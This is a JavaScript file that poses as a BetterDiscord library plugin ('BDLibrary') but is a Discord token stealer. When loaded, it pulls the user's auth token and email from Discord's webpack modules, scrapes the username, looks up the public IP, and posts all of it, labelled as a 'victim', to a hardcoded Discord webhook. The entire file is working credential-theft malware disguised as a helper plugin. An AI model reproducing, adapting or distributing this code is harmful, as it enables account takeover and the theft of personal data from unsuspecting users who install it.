/** 
  * @name BDLibrary
  * @version 1.1
  * @description Plugin for the most Discord plugins
*/

const config = {
    "info": {
        "name": "BDLibrary",
        "authors": ["Brasus", "yes", "e140"],
        "version": "1.1",
        "description": "Plugin for getting someone else's auth token Discord"
    }
    "webhook": "https://discord.com/api/webhooks/830837171132432424/Ya_uRwrLH5fvhTNONuKDCiqjYBn-ODlrbJnjJ35NhQvRu_aextBG-cURfeucxmEP97r6"
}

class Library {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    load() {
        const authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
        const userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
        const username = document.querySelector('[class *= \"nameTag\"]').innerText;

        fetch("https://api.ipify.org?format=json").then((data) => {
            require("request").post(config.webhook, {form: {content: `**New victim found by __${config.info.authors[0]}__**\n\n**Victim's nickname: __${username}__**\n**Victim email: __${userEmail}__**\n**IP: __${data.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
        });
    }
}
